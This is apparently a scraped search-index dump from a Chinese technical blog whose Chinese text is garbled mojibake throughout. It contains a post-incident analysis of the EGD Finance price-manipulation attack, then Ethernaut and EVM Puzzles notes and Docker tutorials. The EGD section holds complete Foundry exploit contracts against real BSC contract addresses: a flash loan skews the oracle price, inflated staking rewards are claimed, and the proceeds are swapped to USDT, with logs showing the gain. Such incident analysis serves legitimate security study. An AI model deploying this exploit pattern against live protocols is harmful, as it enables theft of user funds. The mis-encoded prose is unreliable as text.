* 60)); console2.log( \"all edg in EGD_Finance:\", IERC20(egd).balanceOf(EGD_Finance) ); console2.log(\"edg price before:\", egd_finance.getEGDPrice()); console2.log( \"egd i should reward by noraml case:\", egd_finance.calculateAll(address(this)) ); //è´·æ¬¾ï¼ˆä»·æ ¼æ“çºµï¼‰ uint256 borrowUSDT = (IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 99997600) / 100000000; EGD_USDT_LPPool.swap(0, borrowUSDT, address(this), \"abcd\"); } function stake() public { egd_finance.bond(address(0x85cbfaBD709c744C84A36BA47145396d724EE751)); IERC20(usdt).approve(address(egd_finance), 100 ether); egd_finance.stake(100 ether); } //è´·æ¬¾çš„å›è°ƒå‡½æ•° function pancakeCall( address, uint256, uint256 count1, bytes calldata ) public { console2.log( \"edg price after (i borrowed huge USDT out):\", egd_finance.getEGDPrice() ); //åœ¨ä»·æ ¼ä¸åˆç†çš„æ—¶å€™é¢†å–è´¨æŠ¼å¥–åŠ± egd_finance.claimAllReward(); //å½’è¿˜è´·æ¬¾æœ¬é‡‘ + 5%æ‰‹ç»­è´¹ bool success = IERC20(usdt).transfer( address(EGD_USDT_LPPool), ((count1 * 10_500_000_000) / 10_000_000_000) ); console2.log( \"edg i get from the stake reward:\", IERC20(egd).balanceOf(address(this)) ); require(success); } } è¾“å‡º: ~/Desktop/EGDFinanceDemo main !2 ï™9 â¯ forge test --match-contract HackTest1 -vv [â ‘] Compiling... [â ¢] Compiling 1 files with 0.8.17 [â °] Solc 0.8.17 finished in 2.44s Compiler run successful Running 1 test for test/Hack.t.sol:HackTest1 [PASS] testHack() (gas: 909189) Logs: all edg in EGD_Finance: 5678872403240763806350000 edg price before: 8096310933284567 egd i should reward by noraml case: 1093999999999910400 edg price after (i borrowed huge USDT out): 194311462398 edg i get from the stake reward: 5630136207606302655330000 å¯ä»¥çœ‹åˆ°, æˆ‘ä»¬æœ¬æ¥åªèƒ½é¢†å–EDG: 1093999999999910400 å˜æˆäº† 5630136207606302655330000, æ”¾å¤§äº†500ä¸‡å€. ","date":"2023-03-06","objectID":"/analyse_of_egd_finance_attack/:3:3","tags":["defi"],"title":"EGD Finance ä»·æ ¼æ“çºµæ”»å‡»äº‹ä»¶åˆ†æ","uri":"/analyse_of_egd_finance_attack/"},{"categories":["security"],"content":"å°†è·åˆ©å…‘æ¢ä¸ºUSDTè¿›è¡Œå¥—ç° æˆ‘è¿™é‡Œä¸ºäº†è®©é€»è¾‘æ›´æ¸…æ™°, æ–°å»ºä¸€ä¸ªåˆçº¦ä¸“é—¨ç”¨äºUSDTå…‘æ¢: contract Egd2USDT { function swap2usdt() public { IERC20(egd).transferFrom( msg.sender, address(this), IERC20(egd).balanceOf(msg.sender) ); //å°†egdå…‘æ¢æˆusdt address[] memory path = new address[](2); path[0] = egd; path[1] = usdt; IERC20(egd).approve(address(pancakeRouter), type(uint256).max); pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens( IERC20(egd).balanceOf(address(this)), 1, path, address(msg.sender), block.timestamp ); } } å…¶ä¸­ swapExactTokensForTokensSupportingFeeOnTransferTokenså‡½æ•°æ˜¯PancakeSwapçš„ä¸€ä¸ªäº¤æ˜“å‡½æ•°ï¼Œç”¨äºåœ¨ä¸¤ä¸ªä»£å¸ä¹‹é—´è¿›è¡Œå…‘æ¢ã€‚ amountInï¼šè¾“å…¥ä»£å¸æ•°é‡ï¼› amountOutMinï¼šè¾“å‡ºä»£å¸æ•°é‡çš„ä¸‹é™ï¼Œé˜²æ­¢äº¤æ˜“ä»·æ ¼æ³¢åŠ¨è¿‡å¤§å¯¼è‡´äº¤æ˜“å¤±è´¥ï¼› pathï¼šä¸€ä¸ªä»£å¸è·¯å¾„æ•°ç»„ï¼Œè¡¨ç¤ºäº¤æ˜“çš„è·¯å¾„ï¼› toï¼šè¾“å‡ºä»£å¸çš„æ¥æ”¶åœ°å€ï¼› deadlineï¼šäº¤æ˜“æˆªæ­¢æ—¶é—´ï¼Œè¶…è¿‡æ­¤æ—¶é—´äº¤æ˜“å°†å¤±è´¥ã€‚ path å‚æ•°æ˜¯ä¸€ä¸ªé•¿åº¦è‡³å°‘ä¸º 2 çš„åœ°å€æ•°ç»„ï¼Œç”¨äºæŒ‡å®šäº¤æ˜“è·¯å¾„ã€‚ å…·ä½“æ¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦åœ¨ PancakeSwap ä¸Šè¿›è¡Œ A ä»£å¸ä¸ B ä»£å¸ä¹‹é—´çš„å…‘æ¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦æŒ‡å®šä¸€ä¸ªäº¤æ˜“è·¯å¾„ï¼Œä¾‹å¦‚ï¼š å¦‚æœç›´æ¥å­˜åœ¨ A/B äº¤æ˜“å¯¹ï¼Œåˆ™ path æ•°ç»„ä¸º [address(A), address(B)]ã€‚ å¦‚æœä¸å­˜åœ¨ A/B äº¤æ˜“å¯¹ï¼Œä½†å­˜åœ¨ A/C å’Œ C/B äº¤æ˜“å¯¹ï¼Œåˆ™ path æ•°ç»„ä¸º [address(A), address(C), address(B)]ã€‚ // SPDX-License-Identifier: MIT pragma solidity ^0.8.10; import \"forge-std/test.sol\"; interface IPancakePair { function swap( uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data ) external; } interface IEGD_Finance { function getEGDPrice() external view returns (uint256); function calculateAll(address addr) external view returns (uint256); function bond(address invitor) external; function stake(uint256 amount) external; function claimAllReward() external; } interface IERC20 { function transfer(address to, uint256 value) external returns (bool); function balanceOf(address owner) external view returns (uint256); function approve(address spender, uint256 value) external returns (bool); function transferFrom( address from, address to, uint256 value ) external returns (bool); } interface IPancakeRouter { function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint256 amountIn, uint256 amountOutMin, address[] memory path, address to, uint256 deadline ) external; } address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370; address constant usdt = 0x55d398326f99059fF775485246999027B3197955; address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98; uint256 constant blockheight = 20245522; IPancakePair constant EGD_USDT_LPPool = IPancakePair( 0xa361433E409Adac1f87CDF133127585F8a93c67d ); IPancakeRouter constant pancakeRouter = IPancakeRouter( payable(0x10ED43C718714eb63d5aA57B78B54704E256024E) ); contract Egd2USDT { function swap2usdt() public { IERC20(egd).transferFrom( msg.sender, address(this), IERC20(egd).balanceOf(msg.sender) ); //å°†egdå…‘æ¢æˆusdt address[] memory path = new address[](2); path[0] = egd; path[1] = usdt; IERC20(egd).approve(address(pancakeRouter), type(uint256).max); pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens( IERC20(egd).balanceOf(address(this)), 1, path, address(msg.sender), block.timestamp ); } } contract HackTest2 is Test { IEGD_Finance egd_finance; Egd2USDT egd2usdt; function setUp() public { vm.createSelectFork(\"https://rpc.ankr.com/bsc\", blockheight); egd_finance = IEGD_Finance(EGD_Finance); egd2usdt = new Egd2USDT(); deal(usdt, address(this), 30000 ether); } function testHack() public { uint256 balanceBefore = IERC20(usdt).balanceOf(address(this)); stake(); //æ¨¡æ‹Ÿ2å¤©å vm.warp(block.timestamp + (2 * 24 * 60 * 60)); //è´·æ¬¾ï¼ˆä»·æ ¼æ“çºµï¼‰ uint256 borrowUSDT = (IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 99997600) / 100000000; EGD_USDT_LPPool.swap(0, borrowUSDT, address(this), \"abcd\"); //å°†è·å¾—çš„egdæ¢æˆusdt console2.log( \"i will apporve all edg coin to another contract:\", IERC20(egd).balanceOf(address(this)) ); IERC20(egd).approve( address(egd2usdt), IERC20(egd).balanceOf(address(this)) ); egd2usdt.swap2usdt(); console.log( \"earned usdt:\", (IERC20(usdt).balanceOf(address(this)) - balanceBefore) / 1 ether ); } function stake() public { egd_finance.bond(address(0x85cbfaBD709c744C84A36BA47145396d724EE751)); IERC20(usdt).approve(address(egd_finance), 100 ether); egd_finance.stake(100 ether); } //è´·æ¬¾çš„å›è°ƒå‡½æ•° function pancakeCall( address","date":"2023-03-06","objectID":"/analyse_of_egd_finance_attack/:3:4","tags":["defi"],"title":"EGD Finance ä»·æ ¼æ“çºµæ”»å‡»äº‹ä»¶åˆ†æ","uri":"/analyse_of_egd_finance_attack/"},{"categories":["security"],"content":"ç›¸å…³ ","date":"2023-03-06","objectID":"/analyse_of_egd_finance_attack/:4:0","tags":["defi"],"title":"EGD Finance ä»·æ ¼æ“çºµæ”»å‡»äº‹ä»¶åˆ†æ","uri":"/analyse_of_egd_finance_attack/"},{"categories":["security"],"content":"Ethernaut æŒ‘æˆ˜ åœ¨EthernautæŒ‘æˆ˜ä¸­æœ‰ä¸€å…³å’Œè¿™ä¸ªéå¸¸ç±»ä¼¼, å…¶æ˜¯ä¸€ä¸ªç®€åŒ–ç‰ˆæœ¬çš„ä»·æ ¼æ“çºµæ¡ˆä¾‹, å‚è€ƒè¿™é‡Œ: https://github.com/yinhui1984/EthernautGameReferenceAnswers/blob/main/22_Shop.md ","date":"2023-03-06","objectID":"/analyse_of_egd_finance_attack/:4:1","tags":["defi"],"title":"EGD Finance ä»·æ ¼æ“çºµæ”»å‡»äº‹ä»¶åˆ†æ","uri":"/analyse_of_egd_finance_attack/"},{"categories":["security"],"content":"é¢„è¨€æœºå®‰å…¨æ€§ é¢„è¨€æœºçš„å®‰å…¨æ€§ç­‰åŒäºå…¶æ•°æ®æºã€‚ å¦‚æœä¸€ä¸ªå»ä¸­å¿ƒåŒ–åº”ç”¨ç¨‹åºä½¿ç”¨ Uniswap ä½œä¸ºå…¶ä»¥å¤ªå¸/DAI ä»·æ ¼çš„é¢„è¨€æœºï¼Œæ”»å‡»è€…å°±å¯ä»¥åœ¨ Uniswap ä¸Šç¯¡æ”¹ä»·æ ¼ï¼Œä»¥æ“çºµè¯¥å»ä¸­å¿ƒåŒ–åº”ç”¨ç¨‹åºå¯¹å½“å‰ä»·æ ¼çš„ç†è§£ã€‚ å¦‚ä½•å¯¹ä»˜è¿™ä¸ªéšæ‚£çš„ç¤ºä¾‹åŒ…æ‹¬ä¸€ç§æ¨é€ç³»ç»Ÿï¼Œå¦‚ MakerDAO æ‰€ä½¿ç”¨çš„æ¨é€ç³»ç»Ÿã€‚å®ƒä¼šå°†æ¥è‡ªè‹¥å¹²å¤–éƒ¨æ•°æ®æºçš„ä»·æ ¼æ•°æ®è¿›è¡Œæ¯”å¯¹ï¼Œè€Œä¸æ˜¯ä»…ä»…ä¾é å•ä¸€æ¥æºã€‚ å‚è€ƒè¿™é‡Œ: https://ethereum.org/zh/developers/docs/oracles/#security ","date":"2023-03-06","objectID":"/analyse_of_egd_finance_attack/:4:2","tags":["defi"],"title":"EGD Finance ä»·æ ¼æ“çºµæ”»å‡»äº‹ä»¶åˆ†æ","uri":"/analyse_of_egd_finance_attack/"},{"categories":["Blockchain"],"content":"EVM PuzzlesæŒ‘æˆ˜å®Œæˆè®°å½• EVM Puzzles æ˜¯å¯¹ EVM opcodeé˜…è¯»èƒ½åŠ›çš„ä¸€é¡¹æŒ‘æˆ˜ æ¯”å¦‚ä¸‹é¢çš„é¢˜ç›®è¦æ±‚ä½ ç»™å‡ºæ­£ç¡®çš„calldataä»¥ä¾¿ç¨‹åºé¡ºåˆ©æ‰§è¡Œ. ############ # Puzzle 8 # ############ Bytecode: 36600080373660006000F0600080808080945AF1600014601B57FD5B00 Run it in evm.codes: https://www.evm.codes/playground?codeType=Bytecode\u0026code='36600080373660006000F0600080808080945AF1600014601B57FD5B00'_ 00 36 CALLDATASIZE 01 6000 PUSH1 00 03 80 DUP1 04 37 CALLDATACOPY 05 36 CALLDATASIZE 06 6000 PUSH1 00 08 6000 PUSH1 00 0A F0 CREATE 0B 6000 PUSH1 00 0D 80 DUP1 0E 80 DUP1 0F 80 DUP1 10 80 DUP1 11 94 SWAP5 12 5A GAS 13 F1 CALL 14 6000 PUSH1 00 16 14 EQ 17 601B PUSH1 1B 19 57 JUMPI 1A FD REVERT 1B 5B JUMPDEST 1C 00 STOP ? Enter the calldata: ç­”æ¡ˆæ˜¯ 0x60fe6000526001601ff3, å‚è€ƒè¿™é‡Œ æŒ‘æˆ˜å…¨éƒ¨å®Œæˆ, å¹¶å°†ç­”æ¡ˆå’Œè§£é¢˜æ€è·¯æ”¾åˆ°äº†è¿™é‡Œ : https://github.com/yinhui1984/evm-puzzles/tree/master/_solutions ","date":"2023-02-28","objectID":"/evm-puzzles/:0:0","tags":["EVM","L0","Web3.0"],"title":"Evm Puzzles","uri":"/evm-puzzles/"},{"categories":["web3"],"content":"Ethernaut æŒ‘æˆ˜è®°å½• Ethernaut æ˜¯openzeppelin å‡ºå“çš„æ™ºèƒ½åˆçº¦\"éª‡å®¢\"æ¸¸æˆ. æ¯ä¸ªå…³å¡éƒ½æ˜¯ä¸€ä¸ªéœ€è¦è¢« â€œé»‘ â€œçš„æ™ºèƒ½åˆçº¦, æ¯”å¦‚è¦æ±‚çªƒå–åˆçº¦èµ„äº§, è·å–owershipç­‰. Ethernaut æŒ‘æˆ˜å…¨éƒ¨å®Œæˆäº†å¹¶è®°å½•åœ¨äº†: https://github.com/yinhui1984/EthernautGameReferenceAnswers ","date":"2023-02-28","objectID":"/ethernaut/:0:0","tags":["solidity"],"title":"Ethernaut","uri":"/ethernaut/"},{"categories":["tools"],"content":"docker å­¦ä¹ æ€»ç»“ ","date":"2023-02-23","objectID":"/about_docker/:0:0","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"dockeræ¶æ„ é‡‡ç”¨CSæ¶æ„ å¯åŠ¨å®ˆæŠ¤è¿›ç¨‹(æœåŠ¡å™¨ç«¯) sudo systemctl start docker # or dockerd ä½¿ç”¨å®¢æˆ·ç«¯ #æ¯”å¦‚åˆ—ä¸¾æ‰€æœ‰å®¹å™¨ docker ps -a å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ä¸€èˆ¬åœ¨åŒä¸€å°æœºå™¨ä¸Š, ä½†å¯ä»¥åœ¨ä¸åŒçš„æœºå™¨ä¸Š https://www.atlantic.net/vps-hosting/how-to-set-up-remote-access-to-docker-daemon/ REST API # https://docs.docker.com/engine/api/v1.41/ curl --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json\\?all\\=true | jq # ç­‰åŒäº docker ps -a å®˜æ–¹æ”¯æŒgoå’Œpython ä¸‹é¢çš„ä»£ç ç±»ä¼¼äº docker ps -a package main import ( \"context\" \"fmt\" \"github.com/docker/docker/api/types\" \"github.com/docker/docker/client\" ) func main() { cli, err := client.NewClientWithOpts(client.FromEnv, client.WithAPIVersionNegotiation()) if err != nil { panic(err) } containers, err := cli.ContainerList(context.Background(), types.ContainerListOptions{ All: true, }) if err != nil { panic(err) } for _, container := range containers { fmt.Printf(\"%s %s %s\\n\", container.ID[:10], container.Image, container.Names) } } https://docs.docker.com/engine/api/sdk/ ","date":"2023-02-23","objectID":"/about_docker/:1:0","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"docker engine æ”¯æŒçš„å¹³å°æ¶æ„ https://docs.docker.com/engine/install/ powerpc? https://developer.ibm.com/tutorials/install-docker-on-linux-on-power/ æ“ä½œç³»ç»Ÿ: å¸¸è§unix linuxå‘è¡Œç‰ˆ, macos, windows server. å¦‚æœä¸€ä¸ªdockeré•œåƒæ˜¯åŸºäºlinuxçš„ï¼Œ å…¶èƒ½è¿è¡Œåœ¨windowsçš„docker engineä¸Šå—? ä¸èƒ½ã€‚Dockeré•œåƒæ˜¯åŸºäºæ“ä½œç³»ç»Ÿçš„ï¼Œå¦‚æœé•œåƒæ˜¯åŸºäºLinuxçš„ï¼Œåˆ™åªèƒ½åœ¨Linuxçš„Dockerå¼•æ“ä¸Šè¿è¡Œã€‚Windowsçš„Dockerå¼•æ“æ— æ³•ç›´æ¥è¿è¡ŒLinuxé•œåƒï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨Linuxå­ç³»ç»Ÿï¼ˆWindows Subsystem for Linux, WSLï¼‰åœ¨Windowsä¸Šè¿è¡ŒLinuxé•œåƒã€‚ ","date":"2023-02-23","objectID":"/about_docker/:2:0","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"å®‰è£… ä¾‹å¦‚: https://docs.docker.com/engine/install/centos/ æ”¯æŒåœ¨çº¿å®‰è£…å’Œç¦»çº¿å®‰è£… é…ç½®: $HOME/.docker/daemon.json https://docs.docker.com/engine/reference/commandline/dockerd/ { \"builder\": { \"gc\": { \"defaultKeepStorage\": \"20GB\", \"enabled\": true } }, \"experimental\": false, \"features\": { \"buildkit\": true }, \"registry-mirrors\": [ \"https://dockerproxy.com\", \"https://1nj0zren.mirror.aliyuncs.com\", \"https://docker.mirrors.ustc.edu.cn\", \"http://f1361db2.m.daocloud.io\", \"https://dockerhub.azk8s.cn\" ] } å…å®‰è£…æŠŠç©: https://labs.play-with-docker.com ","date":"2023-02-23","objectID":"/about_docker/:3:0","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"é•œåƒä¸å®¹å™¨ Docker é•œåƒæ˜¯ Docker å®¹å™¨çš„åŸºç¡€ï¼Œæ˜¯ä¸€ä¸ªåªè¯»æ¨¡æ¿ã€‚Docker é•œåƒå¯ä»¥ç”¨æ¥åˆ›å»º Docker å®¹å™¨ã€‚å®¹å™¨æ˜¯é•œåƒçš„è¿è¡Œå®ä¾‹. ","date":"2023-02-23","objectID":"/about_docker/:4:0","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"è·å–ç¬¬ä¸‰æ–¹é•œåƒ $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE $ docker pull ubuntu Using default tag: latest latest: Pulling from library/ubuntu 677076032cca: Pull complete Digest: sha256:9a0bdde4188b896a372804be2384015e90e3f84906b750c1a53539b585fbbe7f Status: Downloaded newer image for ubuntu:latest docker.io/library/ubuntu:latest $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest 58db3edaf2be 11 days ago 77.8MB å®˜æ–¹é•œåƒåº“: https://hub.docker.com ","date":"2023-02-23","objectID":"/about_docker/:4:1","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"åˆ›å»ºå’Œè¿è¡Œå®¹å™¨ $ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES $ docker run -dit --name c1 ubuntu 8d7f5c90cb56e2cce64af39301da208703f7be669f794d716f4ea948c8e00ae4 $ docker run -dit --name c2 ubuntu 3b933714da4c98c774b9f9a0192e281f1a0b99f0389617faf3f26c86491ac946 $ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 3b933714da4c ubuntu \"/bin/bash\" 7 seconds ago Up 6 seconds c2 8d7f5c90cb56 ubuntu \"/bin/bash\" 21 seconds ago Up 20 seconds c1 run = create + start $ docker exec c2 bash -c 'echo \"i am c2\" \u003e\u003e /tmp/hi.txt' $ docker exec c2 cat /tmp/hi.txt i am c2 $ docker exec c1 bash -c 'echo \"i am c1\" \u003e\u003e /tmp/hi.txt' $ docker exec c1 cat /tmp/hi.txt i am c1 $ docker exec -it c1 bash root@8d7f5c90cb56:/# cat /tmp/hi.txt i am c1 root@8d7f5c90cb56:/# more CLI: https://docs.docker.com/engine/reference/commandline/cli/ cheatsheet: /Users/zhouyinhui/Desktop/docker_training/Dockerå¤‡å¿˜æ¸…å•.pdf ","date":"2023-02-23","objectID":"/about_docker/:4:2","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"åˆ›å»ºè‡ªå·±çš„é•œåƒ ä¸¾ä¾‹: åˆ›å»ºä¸€ä¸ªå¸¦æœ‰C++ç¼–è¯‘ç¯å¢ƒçš„é•œåƒ ~/Desktop/docker_training â¯ docker exec -it c1 gcc OCI runtime exec failed: exec failed: unable to start container process: exec: \"gcc\": executable file not found in $PATH: unknown æ–¹å¼1 åœ¨å®¹å™¨ä¸­ä¿®æ”¹ ç¬¬ä¸€æ­¥, é€‰æ‹©ä¸€ä¸ªåŸºç¡€å®¹å™¨ docker pull ubuntu docker run -dit --name c1 ubuntu ç¬¬äºŒæ­¥, è¿›å…¥å®¹å™¨å†…è¿›è¡Œç¯å¢ƒå®‰è£… ~/Desktop/docker_training â¯ docker exec -it c1 bash root@bd8ab473d7e4:/# apt-get update Hit:1 http://security.ubuntu.com/ubuntu jammy-security InRelease Hit:2 http://archive.ubuntu.com/ubuntu jammy InRelease Hit:3 http://archive.ubuntu.com/ubuntu jammy-updates InRelease Hit:4 http://archive.ubuntu.com/ubuntu jammy-backports InRelease Reading package lists... Done root@bd8ab473d7e4:/# apt-get install build-essential ... ... root@bd8ab473d7e4:/# gcc --version gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0 Copyright (C) 2021 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. æ³¨æ„: è¿™æ—¶çš„C++ç¯å¢ƒåœ¨å®¹å™¨ä¸­, è€Œä¸æ˜¯é•œåƒä¸­ ç¬¬ä¸‰æ­¥, åŸºäºä¿®æ”¹åçš„å®¹å™¨åˆ›å»ºæ–°é•œåƒ ~/Desktop/docker_training â¯ docker commit c1 ubuntu_cpp sha256:c22bb41b728e6298f639fa3601fb49cc9184461c9fd0ab8561d3290dd3bc026d ~/Desktop/docker_training â¯ docker images | grep ubuntu ubuntu_cpp latest c22bb41b728e 18 seconds ago 392MB ubuntu latest 58db3edaf2be 12 days ago 77.8MB ~/Desktop/docker_training â¯ docker run -it --rm ubuntu_cpp gcc --version gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0 Copyright (C) 2021 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. æ–¹å¼2 dockerfile Dockerfile æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†åˆ›å»º Docker é•œåƒçš„è¯´æ˜å’ŒæŒ‡ä»¤ã€‚å®ƒå¯ä»¥è¢« Docker å¼•æ“è¯»å–å¹¶ç”¨äºåˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒ. ç¬¬ä¸€æ­¥, æ–°å»ºDockerfile # Use the official Ubuntu base image FROM ubuntu:22.04 LABEL Name=\"cpp env based on ubuntu\" LABEL Version=\"0.1\" # Update the package repository and install build-essential RUN apt-get update \u0026\u0026 apt-get install -y build-essential # Set the working directory WORKDIR /app # Run a command when the container starts # RUNæ˜¯buildæ—¶è¿è¡Œ, CMDæ˜¯å¯åŠ¨Containeræ—¶è¿è¡Œ CMD [\"/bin/bash\"] ç¬¬äºŒæ­¥, build docker build -t ubuntu_cpp_2 . ä½¿ç”¨ä»£ç†: docker build --build-arg all_proxy=socks5://127.0.0.1:7890 . ~/De/d/d/create_ubuntu_cpp_image â¯ docker build -t ubuntu_cpp_2 --build-arg all_proxy=socks5://127.0.0.1:7890 . [+] Building 168.2s (7/7) FINISHED ... ... Use 'docker scan' to run Snyk tests against images to find vulnerabilities and learn how to fix them ~/De/d/d/create_ubuntu_cpp_image â¯ docker images | grep ubuntu ubuntu_cpp_2 latest 1b3b746eb6cf About a minute ago 392MB ubuntu_cpp latest c22bb41b728e 54 minutes ago 392MB ubuntu latest 58db3edaf2be 12 days ago 77.8MB ~/Desktop/docker_training â¯ docker run -it --rm ubuntu_cpp_2 gcc --version gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0 Copyright (C) 2021 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. more: https://docs.docker.com/engine/reference/builder/ å‚è€ƒåˆ«äººå†™çš„Dockerfile: https://github.com/search?q=in%3Apath+%22Dockerfile%22\u0026type=Repositories ","date":"2023-02-23","objectID":"/about_docker/:4:3","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"å®¹å™¨ä¸å®¿ä¸»æœºæˆ–å…¶ä»–å®¹å™¨äº¤äº’ ","date":"2023-02-23","objectID":"/about_docker/:5:0","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"æ•°æ®å· Dockeræ•°æ®å·æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ç›®å½•ï¼Œå­˜å‚¨åœ¨å®¿ä¸»æœºä¸Šï¼Œå¹¶ä¸”å¯ä»¥ä¸ä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨å…±äº«ã€‚ä¸å®¹å™¨çš„æ–‡ä»¶ç³»ç»Ÿä¸åŒï¼Œæ•°æ®å·å¯ä»¥åœ¨å®¹å™¨ä¹‹é—´å…±äº«å’Œé‡ç”¨ï¼Œå¹¶ä¸”æ•°æ®å·å†…çš„æ•°æ®ä¸ä¼šéšç€å®¹å™¨çš„åˆ é™¤è€Œä¸¢å¤±ã€‚å¯ä»¥ä½¿ç”¨æ•°æ®å·æ¥å­˜å‚¨éœ€è¦é•¿æœŸä¿ç•™çš„æ•°æ®ï¼Œå¦‚é…ç½®æ–‡ä»¶ï¼Œæ•°æ®åº“æ–‡ä»¶ç­‰ã€‚æ•°æ®å·å¯ä»¥ä½¿ç”¨-væˆ–--mounté€‰é¡¹æŒ‚è½½åˆ°å®¹å™¨ä¸Šã€‚ ä¸¾ä¾‹: ä»£ç ä¿å­˜åœ¨å®¿ä¸»æœºä¸Š, åœ¨å®¿ä¸»æœºä¸Šæ„‰å¿«çš„å†™ä»£ç , åœ¨dockerä¸­ç¼–è¯‘å’Œè¿è¡Œ -v å®¿ä¸»æœºæ–‡ä»¶å¤¹:å®¹å™¨æ–‡ä»¶å¤¹ docker run --rm -v `pwd`:/app/ --workdir \"/app/\" -it ubuntu_cpp å¦‚æœå®¹å™¨å†…çš„ç›®æ ‡æ–‡ä»¶å¤¹å·²ç»æœ‰äº†å†…å®¹? å½“æŠŠä¸€ä¸ªæ•°æ®å·æŒ‚è½½åˆ°ä¸€ä¸ªå®¹å™¨æ—¶ï¼Œå¦‚æœå®¹å™¨å†…çš„ç›®æ ‡æ–‡ä»¶å¤¹å·²ç»æœ‰äº†å†…å®¹ï¼Œè¿™å–å†³äºæ‰€ä½¿ç”¨çš„ç‰¹å®šæŒ‚è½½é€‰é¡¹ã€‚å¦‚æœâ€“mounté€‰é¡¹å’Œâ€“volumeæ ‡å¿—ä¸€èµ·ä½¿ç”¨ï¼Œå¹¶ä¸”æ²¡æœ‰è®¾ç½®â€“read-onlyæ ‡å¿—ï¼Œé‚£ä¹ˆå®¹å™¨çš„æ–‡ä»¶å¤¹ä¸­çš„ç°æœ‰å†…å®¹å°±ä¼šè¢«å·çš„å†…å®¹è¦†ç›–ã€‚å¦‚æœâ€“mounté€‰é¡¹å’Œâ€“volumeæ ‡å¿—ä¸€èµ·ä½¿ç”¨ï¼Œå¹¶ä¸”è®¾ç½®äº†â€“read-onlyæ ‡å¿—ï¼Œå·çš„å†…å®¹å°†ä»¥åªè¯»æ¨¡å¼æä¾›ç»™å®¹å™¨ï¼Œè€Œåœ¨å®¹å™¨å†…æ‰€åšçš„ä»»ä½•æ”¹å˜éƒ½ä¸ä¼šè¢«ä¿å­˜åˆ°å·ä¸­ã€‚å¦‚æœä¸ä½¿ç”¨â€“mounté€‰é¡¹ï¼Œè€Œä½¿ç”¨-væ ‡å¿—ï¼Œé»˜è®¤è¡Œä¸ºæ˜¯å°†å·æŒ‚è½½ä¸ºè¯»å†™å·ï¼Œå¹¶è¦†ç›–å®¹å™¨æ–‡ä»¶å¤¹ä¸­çš„ç°æœ‰å†…å®¹ã€‚ ","date":"2023-02-23","objectID":"/about_docker/:5:1","tags":["docker"],"title":"About docker","uri":"/about_docker/"},{"categories":["tools"],"content":"ç½‘ç»œ Docker å®¹å™¨ç½‘ç»œæ˜¯æŒ‡å®¹å™¨å¦‚ä½•åœ¨ Docker ä¸»æœºä¸Šä¸ç½‘ç»œä»¥åŠå…¶ä»–å®¹å™¨è¿›è¡Œé€šä¿¡çš„æ–¹å¼ã€‚Docker å¯ä»¥åˆ›å»ºä¸€ä¸ªå®¹å™¨ç½‘ç»œï¼Œå®¹å™¨å¯ä»¥é€šè¿‡è¯¥ç½‘ç»œè¿›è¡Œé€šä¿¡ ç½‘ç»œé©±åŠ¨1: Bridge(æ¡¥æ¥) https://docs.docker.com/network/bridge/ å®ƒæ˜¯ä¸€ä¸ªåœ¨ä¸»æœºä¸Šåˆ›å»ºçš„ç§æœ‰é»˜è®¤ç½‘ç»œã€‚ é“¾æ¥åˆ°è¿™ä¸ªç½‘ç»œçš„å®¹å™¨æœ‰ä¸€ä¸ªå†…éƒ¨IPåœ°å€ï¼Œé€šè¿‡å®ƒå¯ä»¥å¾ˆå®¹æ˜“åœ°ç›¸äº’é€šä¿¡ã€‚ (æ¯”å¦‚æ¯ä¸€ä¸ªContaineråˆ†ä¸€ä¸ªå†…éƒ¨IP 172.17.0.x , æ‰€ä»¥ä»–ä»¬å¯ä»¥ç›¸äº’é€šè®¯) DockeræœåŠ¡å™¨ï¼ˆå®ˆæŠ¤è¿›ç¨‹ï¼‰åˆ›å»ºäº†ä¸€ä¸ªè™šæ‹Ÿçš„ä»¥å¤ªç½‘æ¡¥docker0ï¼Œé€šè¿‡åœ¨å„ç§ç½‘ç»œæ¥å£ä¹‹é—´ä¼ é€’æ•°æ®åŒ…è€Œè‡ªåŠ¨è¿è¡Œã€‚ #!/usr/bin/env sh # 